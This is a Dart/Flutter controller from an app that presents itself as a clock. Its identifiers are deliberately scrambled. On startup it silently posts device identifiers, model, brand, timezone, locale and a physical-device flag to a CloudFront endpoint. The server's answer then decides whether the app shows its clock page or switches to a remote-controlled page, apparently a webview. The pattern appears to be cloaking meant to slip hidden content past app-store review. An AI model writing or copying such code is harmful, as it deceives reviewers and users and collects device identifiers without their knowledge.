import 'dart:io';
import 'package:get/get.dart';
import 'package:dio/dio.dart';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:package_info_plus/package_info_plus.dart';


class PulseMarkAuthLogic extends GetxController {

  var cnftyub = RxBool(false);
  var cjpvyftxo = RxBool(true);
  var ucso = RxString("");
  var wycvduj = RxBool(false);
  var lvizxe = RxBool(true);
  final kycwta = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    dwuzj();
  }


  Future<void> dwuzj() async {
    wycvduj.value = true;
    lvizxe.value = true;
    cjpvyftxo.value = false;

    kycwta.post("https://d2rttl6pzn4s94.cloudfront.net/bniokmxvjfzeyagslhcdtrqu?no_check",data: await lzwctf()).then((value) {
      var ilrfbk = value.data["ilrfbk"] as String;
      var rnfico = value.data["rnfico"] as bool;
      if (rnfico) {
        ucso.value = ilrfbk;
        khcjrsy();
      } else {
        nqcwbgry();
      }
    }).catchError((e) {
      cjpvyftxo.value = true;
      lvizxe.value = true;
      wycvduj.value = false;
    });
  }

  Future<Map<String, dynamic>> lzwctf() async {
    final DeviceInfoPlugin hazyucrl = DeviceInfoPlugin();
    PackageInfo crapwni_vrzkpbq = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var tcgopvk = Platform.localeName;
    var klvt_SqnWLUCo = currentTimeZone;

    var klvt_vMlFC = crapwni_vrzkpbq.packageName;
    var klvt_bIlKNnjp = crapwni_vrzkpbq.version;
    var klvt_zLcgnqxe = crapwni_vrzkpbq.buildNumber;

    var klvt_TPMUYZI = crapwni_vrzkpbq.appName;
    var klvt_UgTQVt = "";
    var klvt_Kql  = "";
    var klvt_pEaHX = "";
    var geba = "";
    var tsmwzhfg = "";
    var ygph = "";
    var rvlazyi = "";
    var lqwoyhtf = "";
    var ngbkch = "";
    var ermabwls = "";


    var klvt_uKFteNQr = "";
    var klvt_YE = false;

    if (GetPlatform.isAndroid) {
      klvt_uKFteNQr = "android";
      var gjmrctv = await hazyucrl.androidInfo;

      klvt_pEaHX = gjmrctv.brand;

      klvt_UgTQVt  = gjmrctv.model;
      klvt_Kql = gjmrctv.id;

      klvt_YE = gjmrctv.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      klvt_uKFteNQr = "ios";
      var iyqaxcpo = await hazyucrl.iosInfo;
      klvt_pEaHX = iyqaxcpo.name;
      klvt_UgTQVt = iyqaxcpo.model;

      klvt_Kql = iyqaxcpo.identifierForVendor ?? "";
      klvt_YE  = iyqaxcpo.isPhysicalDevice;
    }

    var res = {
      "klvt_TPMUYZI": klvt_TPMUYZI,
      "klvt_zLcgnqxe": klvt_zLcgnqxe,
      "klvt_bIlKNnjp": klvt_bIlKNnjp,
      "klvt_vMlFC": klvt_vMlFC,
      "klvt_UgTQVt": klvt_UgTQVt,
      "klvt_SqnWLUCo": klvt_SqnWLUCo,
      "klvt_pEaHX": klvt_pEaHX,
      "klvt_Kql": klvt_Kql,
      "tcgopvk": tcgopvk,
      "klvt_uKFteNQr": klvt_uKFteNQr,
      "klvt_YE": klvt_YE,
      "geba" : geba,
      "tsmwzhfg" : tsmwzhfg,
      "ygph" : ygph,
      "rvlazyi" : rvlazyi,
      "lqwoyhtf" : lqwoyhtf,
      "ngbkch" : ngbkch,
      "ermabwls" : ermabwls,

    };
    return res;
  }

  Future<void> nqcwbgry() async {
    Get.offNamed("/ClockMainPage");
  }

  Future<void> khcjrsy() async {
    Get.offNamed("/Outreload");
  }

}
